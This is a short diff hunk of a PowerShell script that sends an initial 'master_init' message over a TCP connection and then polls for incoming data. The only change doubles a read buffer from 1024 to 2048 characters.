@@ -19,7 +19,7 @@ try {
 	$writer.WriteLine("master_init");
 	$writer.Flush();
 
-	$in_buff = [char[]]::new(1024)
+	$in_buff = [char[]]::new(2048)
 	$exit = 0;
 	while ($exit -eq 0) {
 		if($client.Client.Poll(50000,[System.Net.Sockets.SelectMode]::SelectRead) -eq $true) {
